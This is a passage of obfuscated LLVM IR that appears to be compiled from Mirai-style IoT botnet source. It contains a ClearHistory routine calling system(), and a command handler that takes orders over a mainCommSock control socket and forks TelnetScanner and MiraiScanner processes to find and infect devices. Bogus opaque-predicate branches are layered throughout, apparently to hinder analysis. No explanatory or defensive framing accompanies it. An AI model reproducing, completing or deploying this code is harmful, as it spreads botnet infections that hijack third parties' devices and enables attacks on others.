  %111 = alloca i32, align 4
  %112 = alloca i32, align 4
  %113 = alloca [512 x i8], align 16
  %114 = alloca [1 x i8], align 1
  store i8* %0, i8** %103, align 8
  store i8* %1, i8** %104, align 8
  store i16 %2, i16* %105, align 2
  store i8* %3, i8** %106, align 8
  store i32 %4, i32* %107, align 4
  store i32 %5, i32* %108, align 4
  %115 = call i64 @time(i64* null) #5
  %116 = load i32, i32* %107, align 4
  %117 = sext i32 %116 to i64
  %_ = sub i64 0, %115
  %gen = add i64 %_, %117
  %_1 = sub i64 0, %115
  %gen2 = add i64 %_1, %117
  %_3 = sub i64 %115, %117
  %gen4 = mul i64 %_3, %117
  %_5 = sub i64 %115, %117
  %gen6 = mul i64 %_5, %117
  %_7 = sub i64 %115, %117
  %gen8 = mul i64 %_7, %117
  %_9 = shl i64 %115, %117
  %_10 = sub i64 %115, %117
  %gen11 = mul i64 %_10, %117
  %_12 = shl i64 %115, %117
  %118 = add nsw i64 %115, %117
  %119 = trunc i64 %118 to i32
  store i32 %119, i32* %111, align 4
  store i32 0, i32* %112, align 4
  store i32 0, i32* %110, align 4
  br label %originalBB

originalBB13alteredBB:                            ; preds = %originalBB13, %80
  br label %originalBB13
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.922, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @RandomPythonRange() #0 {
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = load i32, i32* @x.115
  %4 = load i32, i32* @y.116
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = alloca i32, align 4
  %47 = alloca i8*, align 8
  %48 = alloca i32, align 4
  %49 = alloca i64, align 8
  store i32 %0, i32* %11, align 4
  store i8** %1, i8*** %12, align 8
  %50 = load i8**, i8*** %12, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 0
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @strcmp(i8* %52, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.923, i32 0, i32 0)) #9
  %54 = icmp ne i32 %53, 0
  %55 = load i32, i32* @x.115
  %56 = load i32, i32* @y.116
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %54, label %104, label %63

; <label>:63:                                     ; preds = %originalBBpart2
  %64 = load i32, i32* %11, align 4
  %65 = icmp slt i32 %64, 2
  br i1 %65, label %72, label %66

; <label>:66:                                     ; preds = %63
  %67 = load i8**, i8*** %12, align 8
  %68 = getelementptr inbounds i8*, i8** %67, i64 1
  %69 = load i8*, i8** %68, align 8
  %70 = call i32 @atoi(i8* %69) #9
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %91

; <label>:72:                                     ; preds = %66, %63
  %73 = load i32, i32* @x.115
  %74 = load i32, i32* @y.116
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %72
  %81 = load i32, i32* @mainCommSock, align 4
  %82 = call i32 (i32, i8*, ...) @sockprintf(i32 %81, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.924, i32 0, i32 0))
  %83 = load i32, i32* @x.115
  %84 = load i32, i32* @y.116
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %103

; <label>:91:                                     ; preds = %66
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = load i32, i32* @telnetrange, align 4
  %94 = load i8**, i8*** %12, align 8
  %95 = getelementptr inbounds i8*, i8** %94, i64 1
  %96 = load i8*, i8** %95, align 8
  %97 = call i32 @atoi(i8* %96) #9
  %98 = call i32 (i32, i8*, ...) @sockprintf(i32 %92, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.925, i32 0, i32 0), i32 %93, i32 %97)
  %99 = load i8**, i8*** %12, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 1
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @atoi(i8* %101) #9
  store i32 %102, i32* @telnetrange, align 4
  br label %103

; <label>:103:                                    ; preds = %91, %originalBBpart24
  br label %2070

; <label>:104:                                    ; preds = %originalBBpart2
  %105 = load i32, i32* @x.115
  %106 = load i32, i32* @y.116
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %104
  %113 = load i8**, i8*** %12, align 8
  %114 = getelementptr inbounds i8*, i8** %113, i64 0
  %115 = load i8*, i8** %114, align 8
  %116 = call i32 @strcmp(i8* %115, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.926, i32 0, i32 0)) #9
  %117 = icmp ne i32 %116, 0
  %118 = load i32, i32* @x.115
  %119 = load i32, i32* @y.116
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %117, label %276, label %126

; <label>:126:                                    ; preds = %originalBBpart28
  %127 = load i32, i32* @x.115
  %128 = load i32, i32* @y.116
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %126
  %135 = load i8**, i8*** %12, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 1
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @strcmp(i8* %137, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.927, i32 0, i32 0)) #9
  %139 = icmp ne i32 %138, 0
  %140 = load i32, i32* @x.115
  %141 = load i32, i32* @y.116
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %139, label %193, label %148

; <label>:148:                                    ; preds = %originalBBpart212
  %149 = call i32 @fork() #5
  store i32 %149, i32* %13, align 4
  store i32 0, i32* %14, align 4
  %150 = call i64 @sysconf(i32 84) #5
  %151 = trunc i64 %150 to i32
  store i32 %151, i32* %15, align 4
  store i32 999999, i32* %16, align 4
  %152 = load i32, i32* %15, align 4
  %153 = icmp eq i32 %152, 1
  br i1 %153, label %154, label %155

; <label>:154:                                    ; preds = %148
  store i32 500, i32* %16, align 4
  br label %155

; <label>:155:                                    ; preds = %154, %148
  %156 = load i32, i32* %15, align 4
  %157 = icmp sge i32 %156, 2
  br i1 %157, label %158, label %159

; <label>:158:                                    ; preds = %155
  store i32 1000, i32* %16, align 4
  br label %159

; <label>:159:                                    ; preds = %158, %155
  %160 = load i32, i32* %13, align 4
  %161 = icmp ugt i32 %160, 0
  br i1 %161, label %162, label %164

; <label>:162:                                    ; preds = %159
  %163 = load i32, i32* %13, align 4
  store i32 %163, i32* @scanPid, align 4
  br label %2070

; <label>:164:                                    ; preds = %159
  %165 = load i32, i32* %13, align 4
  %166 = icmp eq i32 %165, -1
  br i1 %166, label %167, label %168

; <label>:167:                                    ; preds = %164
  br label %2070

; <label>:168:                                    ; preds = %164
  br label %169

; <label>:169:                                    ; preds = %168
  store i32 0, i32* %14, align 4
  br label %170

; <label>:170:                                    ; preds = %189, %169
  %171 = load i32, i32* %14, align 4
  %172 = load i32, i32* %15, align 4
  %173 = icmp slt i32 %171, %172
  br i1 %173, label %174, label %192

; <label>:174:                                    ; preds = %170
  %175 = call i64 @time(i64* null) #5
  %176 = call i32 @getpid() #5
  %177 = sext i32 %176 to i64
  %178 = xor i64 %175, %177
  %179 = call i32 @getppid() #5
  %180 = sext i32 %179 to i64
  %181 = add nsw i64 %178, %180
  %182 = trunc i64 %181 to i32
  call void @srand(i32 %182) #5
  %183 = call i64 @time(i64* null) #5
  %184 = call i32 @getpid() #5
  %185 = sext i32 %184 to i64
  %186 = xor i64 %183, %185
  %187 = trunc i64 %186 to i32
  call void @init_rand(i32 %187)
  %188 = load i32, i32* %16, align 4
  call void @TelnetScanner(i32 100, i32 %188)
  call void @_exit(i32 0) #12
  unreachable
                                                  ; No predecessors!
  %190 = load i32, i32* %14, align 4
  %191 = add nsw i32 %190, 1
  store i32 %191, i32* %14, align 4
  br label %170

; <label>:192:                                    ; preds = %170
  br label %193

; <label>:193:                                    ; preds = %192, %originalBBpart212
  %194 = load i32, i32* @x.115
  %195 = load i32, i32* @y.116
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %193
  %202 = load i8**, i8*** %12, align 8
  %203 = getelementptr inbounds i8*, i8** %202, i64 1
  %204 = load i8*, i8** %203, align 8
  %205 = call i32 @strcmp(i8* %204, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.928, i32 0, i32 0)) #9
  %206 = icmp ne i32 %205, 0
  %207 = load i32, i32* @x.115
  %208 = load i32, i32* @y.116
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %206, label %238, label %215

; <label>:215:                                    ; preds = %originalBBpart216
  %216 = load i32, i32* @x.115
  %217 = load i32, i32* @y.116
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %215
  %224 = load i32, i32* @scanPid, align 4
  %225 = icmp eq i32 %224, 0
  %226 = load i32, i32* @x.115
  %227 = load i32, i32* @y.116
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %225, label %234, label %235

; <label>:234:                                    ; preds = %originalBBpart220
  br label %2070

; <label>:235:                                    ; preds = %originalBBpart220
  %236 = load i32, i32* @scanPid, align 4
  %237 = call i32 @kill(i32 %236, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %238

; <label>:238:                                    ; preds = %235, %originalBBpart216
  %239 = load i8**, i8*** %12, align 8
  %240 = getelementptr inbounds i8*, i8** %239, i64 1
  %241 = load i8*, i8** %240, align 8
  %242 = call i32 @strcmp(i8* %241, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.929, i32 0, i32 0)) #9
  %243 = icmp ne i32 %242, 0
  br i1 %243, label %275, label %244

; <label>:244:                                    ; preds = %238
  %245 = load i8**, i8*** %12, align 8
  %246 = getelementptr inbounds i8*, i8** %245, i64 1
  %247 = load i8*, i8** %246, align 8
  %248 = call i32 @atoi(i8* %247) #9
  store i32 %248, i32* %17, align 4
  %249 = load i8**, i8*** %12, align 8
  %250 = getelementptr inbounds i8*, i8** %249, i64 2
  %251 = load i8*, i8** %250, align 8
  %252 = call i32 @atoi(i8* %251) #9
  store i32 %252, i32* %18, align 4
  %253 = call i32 @listFork()
  %254 = icmp ne i32 %253, 0
  br i1 %254, label %274, label %255

; <label>:255:                                    ; preds = %244
  %256 = load i32, i32* @x.115
  %257 = load i32, i32* @y.116
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %255
  %264 = load i32, i32* %18, align 4
  %265 = load i32, i32* %17, align 4
  call void @TelnetScanner(i32 %264, i32 %265)
  call void @_exit(i32 0) #12
  %266 = load i32, i32* @x.115
  %267 = load i32, i32* @y.116
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  unreachable

; <label>:274:                                    ; preds = %244
  br label %2070

; <label>:275:                                    ; preds = %238
  br label %276

; <label>:276:                                    ; preds = %275, %originalBBpart28
  %277 = load i32, i32* @x.115
  %278 = load i32, i32* @y.116
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %276
  %285 = load i8**, i8*** %12, align 8
  %286 = getelementptr inbounds i8*, i8** %285, i64 0
  %287 = load i8*, i8** %286, align 8
  %288 = call i32 @strcmp(i8* %287, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.930, i32 0, i32 0)) #9
  %289 = icmp ne i32 %288, 0
  %290 = load i32, i32* @x.115
  %291 = load i32, i32* @y.116
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %289, label %528, label %298

; <label>:298:                                    ; preds = %originalBBpart228
  %299 = load i32, i32* @x.115
  %300 = load i32, i32* @y.116
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %298
  %307 = load i8**, i8*** %12, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 1
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @strcmp(i8* %309, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.927, i32 0, i32 0)) #9
  %311 = icmp ne i32 %310, 0
  %312 = load i32, i32* @x.115
  %313 = load i32, i32* @y.116
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %311, label %429, label %320

; <label>:320:                                    ; preds = %originalBBpart232
  %321 = call i32 @fork() #5
  store i32 %321, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %322 = call i64 @sysconf(i32 84) #5
  %323 = trunc i64 %322 to i32
  store i32 %323, i32* %21, align 4
  store i32 999999, i32* %22, align 4
  %324 = load i32, i32* %21, align 4
  %325 = icmp eq i32 %324, 1
  br i1 %325, label %326, label %343

; <label>:326:                                    ; preds = %320
  %327 = load i32, i32* @x.115
  %328 = load i32, i32* @y.116
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %326
  store i32 500, i32* %22, align 4
  %335 = load i32, i32* @x.115
  %336 = load i32, i32* @y.116
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %343

; <label>:343:                                    ; preds = %originalBBpart236, %320
  %344 = load i32, i32* %21, align 4
  %345 = icmp sge i32 %344, 2
  br i1 %345, label %346, label %347

; <label>:346:                                    ; preds = %343
  store i32 1000, i32* %22, align 4
  br label %347

; <label>:347:                                    ; preds = %346, %343
  %348 = load i32, i32* %19, align 4
  %349 = icmp ugt i32 %348, 0
  br i1 %349, label %350, label %352

; <label>:350:                                    ; preds = %347
  %351 = load i32, i32* %19, align 4
  store i32 %351, i32* @miraiPid, align 4
  br label %2070

; <label>:352:                                    ; preds = %347
  %353 = load i32, i32* %19, align 4
  %354 = icmp eq i32 %353, -1
  br i1 %354, label %355, label %356

; <label>:355:                                    ; preds = %352
  br label %2070

; <label>:356:                                    ; preds = %352
  %357 = load i32, i32* @x.115
  %358 = load i32, i32* @y.116
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %356
  %365 = load i32, i32* @x.115
  %366 = load i32, i32* @y.116
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %373

; <label>:373:                                    ; preds = %originalBBpart240
  store i32 0, i32* %20, align 4
  br label %374

; <label>:374:                                    ; preds = %409, %373
  %375 = load i32, i32* @x.115
  %376 = load i32, i32* @y.116
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %374
  %383 = load i32, i32* %20, align 4
  %384 = load i32, i32* %21, align 4
  %385 = icmp slt i32 %383, %384
  %386 = load i32, i32* @x.115
  %387 = load i32, i32* @y.116
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %385, label %394, label %412

; <label>:394:                                    ; preds = %originalBBpart244
  %395 = call i64 @time(i64* null) #5
  %396 = call i32 @getpid() #5
  %397 = sext i32 %396 to i64
  %398 = xor i64 %395, %397
  %399 = call i32 @getppid() #5
  %400 = sext i32 %399 to i64
  %401 = add nsw i64 %398, %400
  %402 = trunc i64 %401 to i32
  call void @srand(i32 %402) #5
  %403 = call i64 @time(i64* null) #5
  %404 = call i32 @getpid() #5
  %405 = sext i32 %404 to i64
  %406 = xor i64 %403, %405
  %407 = trunc i64 %406 to i32
  call void @init_rand(i32 %407)
  %408 = load i32, i32* %22, align 4
  call void @MiraiScanner(i32 100, i32 %408)
  call void @_exit(i32 0) #12
  unreachable
                                                  ; No predecessors!
  %410 = load i32, i32* %20, align 4
  %411 = add nsw i32 %410, 1
  store i32 %411, i32* %20, align 4
  br label %374

; <label>:412:                                    ; preds = %originalBBpart244
  %413 = load i32, i32* @x.115
  %414 = load i32, i32* @y.116
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %412
  %421 = load i32, i32* @x.115
  %422 = load i32, i32* @y.116
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %429

; <label>:429:                                    ; preds = %originalBBpart248, %originalBBpart232
  %430 = load i8**, i8*** %12, align 8
  %431 = getelementptr inbounds i8*, i8** %430, i64 1
  %432 = load i8*, i8** %431, align 8
  %433 = call i32 @strcmp(i8* %432, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.928, i32 0, i32 0)) #9
  %434 = icmp ne i32 %433, 0
  br i1 %434, label %474, label %435

; <label>:435:                                    ; preds = %429
  %436 = load i32, i32* @x.115
  %437 = load i32, i32* @y.116
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %435
  %444 = load i32, i32* @miraiPid, align 4
  %445 = icmp eq i32 %444, 0
  %446 = load i32, i32* @x.115
  %447 = load i32, i32* @y.116
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %445, label %454, label %455

; <label>:454:                                    ; preds = %originalBBpart252
  br label %2070

; <label>:455:                                    ; preds = %originalBBpart252
  %456 = load i32, i32* @x.115
  %457 = load i32, i32* @y.116
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %455
  %464 = load i32, i32* @miraiPid, align 4
  %465 = call i32 @kill(i32 %464, i32 9) #5
  store i32 0, i32* @miraiPid, align 4
  %466 = load i32, i32* @x.115
  %467 = load i32, i32* @y.116
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %474

; <label>:474:                                    ; preds = %originalBBpart256, %429
  %475 = load i32, i32* @x.115
  %476 = load i32, i32* @y.116
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %474
  %483 = load i8**, i8*** %12, align 8
  %484 = getelementptr inbounds i8*, i8** %483, i64 1
  %485 = load i8*, i8** %484, align 8
  %486 = call i32 @strcmp(i8* %485, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.931, i32 0, i32 0)) #9
  %487 = icmp ne i32 %486, 0
  %488 = load i32, i32* @x.115
  %489 = load i32, i32* @y.116
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %487, label %527, label %496

; <label>:496:                                    ; preds = %originalBBpart260
  %497 = load i8**, i8*** %12, align 8
  %498 = getelementptr inbounds i8*, i8** %497, i64 1
  %499 = load i8*, i8** %498, align 8
  %500 = call i32 @atoi(i8* %499) #9
  store i32 %500, i32* %23, align 4
  %501 = load i8**, i8*** %12, align 8
  %502 = getelementptr inbounds i8*, i8** %501, i64 2
  %503 = load i8*, i8** %502, align 8
  %504 = call i32 @atoi(i8* %503) #9
  store i32 %504, i32* %24, align 4
  %505 = call i32 @listFork()
  %506 = icmp ne i32 %505, 0
  br i1 %506, label %510, label %507

; <label>:507:                                    ; preds = %496
  %508 = load i32, i32* %24, align 4
  %509 = load i32, i32* %23, align 4
  call void @MiraiScanner(i32 %508, i32 %509)
  call void @_exit(i32 0) #12
  unreachable

; <label>:510:                                    ; preds = %496
  %511 = load i32, i32* @x.115
  %512 = load i32, i32* @y.116
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %510
  %519 = load i32, i32* @x.115
  %520 = load i32, i32* @y.116
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %2070

; <label>:527:                                    ; preds = %originalBBpart260
  br label %528

; <label>:528:                                    ; preds = %527, %originalBBpart228
  %529 = load i8**, i8*** %12, align 8
  %530 = getelementptr inbounds i8*, i8** %529, i64 0
  %531 = load i8*, i8** %530, align 8
  %532 = call i32 @strcmp(i8* %531, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.932, i32 0, i32 0)) #9
  %533 = icmp ne i32 %532, 0
  br i1 %533, label %575, label %534

; <label>:534:                                    ; preds = %528
  %535 = load i32, i32* @x.115
  %536 = load i32, i32* @y.116
  %537 = sub i32 %535, 1
  %538 = mul i32 %535, %537
  %539 = urem i32 %538, 2
  %540 = icmp eq i32 %539, 0
  %541 = icmp slt i32 %536, 10
  %542 = or i1 %540, %541
  br i1 %542, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %534
  %543 = load i32, i32* %11, align 4
  %544 = icmp slt i32 %543, 2
  %545 = load i32, i32* @x.115
  %546 = load i32, i32* @y.116
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %544, label %559, label %553

; <label>:553:                                    ; preds = %originalBBpart268
  %554 = load i8**, i8*** %12, align 8
  %555 = getelementptr inbounds i8*, i8** %554, i64 1
